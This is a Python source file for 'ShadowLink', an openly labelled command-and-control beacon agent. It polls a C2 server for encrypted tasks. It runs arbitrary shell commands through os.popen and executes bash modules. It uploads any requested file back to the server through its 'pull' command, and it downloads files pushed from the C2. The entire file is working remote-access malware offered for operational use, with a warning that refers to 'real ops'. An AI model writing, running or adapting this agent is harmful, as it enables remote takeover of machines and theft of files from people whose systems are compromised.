#!/usr/bin/env python3
# ShadowLink - Lightweight C2 Beacon Agent
# Author: Zane Anderson (zanderson@iscsecurity.org)

import requests
import time
import base64
import os
import uuid
import argparse

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("[!] PyCryptodome not found. Run: sudo pip3 install pycryptodome")
    exit(1)

# Banner
BLUE = "\033[1;34m"
RESET = "\033[0m"

print(f"{BLUE}")
print("   _____ _               _           _     _       _     ")
print("  / ____| |             | |         | |   (_)     | |    ")
print(" | (___ | |__   ___  ___| | ___  ___| |__  _ _ __ | |__  ")
print("  \\___ \\| '_ \\ / _ \\/ __| |/ _ \\/ __| '_ \\| | '_ \\| '_ \\ ")
print("  ____) | | | |  __/ (__| |  __/ (__| | | | | |_) | | | |")
print(" |_____/|_| |_|\\___|\\___|_|\\___|\\___|_| |_|_| .__/|_| |_|")
print("                                           | |          ")
print("                                           |_|          ")
print("          ShadowLink Beacon - Agent Mode                ")
print(f"{RESET}")

# CLI Argument Parser
parser = argparse.ArgumentParser(description="ShadowLink Beacon Agent")
parser.add_argument("--c2", default="http://127.0.0.1:8000", help="C2 server URL")
parser.add_argument("--sleep", type=int, default=10, help="Beacon interval (seconds)")
parser.add_argument("--agent", default=f"agent_{uuid.uuid4().hex[:6]}", help="Agent ID")
parser.add_argument("--key", help="AES encryption key (32 bytes)")
args = parser.parse_args()

if args.key:
    AES_KEY = args.key.encode()
else:
    AES_KEY = (args.key or 'Your32ByteSuperSecureKey!!123456').encode()
if not args.key:
    print("[!] Warning: Using default AES key. For real ops, use --key to specify a custom 32-byte key.")
if len(AES_KEY) != 32:
    print("[!] AES key must be exactly 32 bytes.")
    exit(1)
    
C2_URL = args.c2
AGENT_ID = args.agent
SLEEP_TIME = args.sleep

def encrypt(data):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_KEY[:16])
    return base64.b64encode(cipher.encrypt(pad(data.encode(), AES.block_size))).decode()

def decrypt(data):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_KEY[:16])
    return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size).decode()

print(f"[*] Agent ID: {AGENT_ID}")
print(f"[*] Connecting to C2 at {C2_URL}")

while True:
    try:
        r = requests.get(f"{C2_URL}/task/{AGENT_ID}")
        if r.status_code == 200 and r.text.strip():
            cmd = decrypt(r.text.strip())
            print(f"[>] Received task from C2: {cmd}")

            if cmd.startswith("fetch_file"):
                _, filename = cmd.split(maxsplit=1)
                file_url = f"{C2_URL}/uploads/{AGENT_ID}_{filename}"
                try:
                    res = requests.get(file_url)
                    if res.status_code == 200:
                        with open(filename, 'wb') as f:
                            f.write(res.content)
                        output = f"[+] File {filename} downloaded."
                    else:
                        output = f"[!] Failed to download file: {filename}"
                except Exception as e:
                    output = f"[!] Error: {str(e)}"

            elif cmd.startswith("pull"):
                _, filepath = cmd.split(maxsplit=1)
                try:
                    with open(filepath, 'rb') as f:
                        content = f.read()
                    encoded_result = encrypt(content.decode(errors='ignore'))
                    requests.post(f"{C2_URL}/result/{AGENT_ID}", data=encoded_result)
                    print(f"[*] Sent file {filepath} to C2")
                    time.sleep(SLEEP_TIME)
                    continue
                except Exception as e:
                    output = f"[!] Failed to read file: {filepath} ({str(e)})"

            elif cmd.startswith("module"):
                try:
                    _, module = cmd.split(maxsplit=1)
                    mod_path = f"modules/{module}.sh"
                    if os.path.exists(mod_path):
                        output = os.popen(f"bash {mod_path}").read()
                    else:
                        output = f"[!] Module not found: {module}"
                except Exception as e:
                    output = f"[!] Module exec error: {str(e)}"

            else:
                try:
                    output = os.popen(cmd).read()
                    if not output:
                        output = "[No Output]"
                except Exception as e:
                    output = f"[!] Error executing command: {str(e)}"

            encrypted_result = encrypt(output)
            requests.post(f"{C2_URL}/result/{AGENT_ID}", data=encrypted_result)
            print("[*] Result sent to C2 successfully.")

        time.sleep(SLEEP_TIME)

    except Exception as e:
        print(f"[!] Connection error: {str(e)}")
        time.sleep(SLEEP_TIME * 2)
